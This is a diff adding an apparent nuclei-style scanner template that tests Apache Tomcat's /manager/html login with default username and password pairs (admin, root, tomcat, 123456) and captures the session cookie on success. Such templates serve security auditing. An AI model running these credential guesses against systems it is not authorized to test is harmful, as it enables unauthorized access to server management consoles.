@@ -1,0 +1,44 @@
+id: tomcat-manager-login
+info:
+  author: pdteam
+  name: tomcat-manager-default-password
+  severity: high
+  tags: tomcat-manager
+  zombie: tomcat
+http:
+  - raw:
+      - |
+        GET /manager/html HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{base64(username + ':' + password)}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0
+        Accept-Language: en-US,en;q=0.9
+    attack: pitchfork
+    stop-at-first-match: true
+    matchers:
+      - status:
+          - 200
+        type: status
+      - type: word
+        words:
+          - Apache Tomcat
+    extractors:
+      - type: regex
+        name: cookie
+        internal: true
+        part: header
+        regex:
+          - 'JSESSIONID\..*=([a-z0-9.]+)'
+    matchers-condition: and
+    payloads:
+      username:
+        - admin
+        - root
+        - tomcat
+        - admin
+      password:
+        - admin
+        - root
+        - tomcat
+        - 123456
+
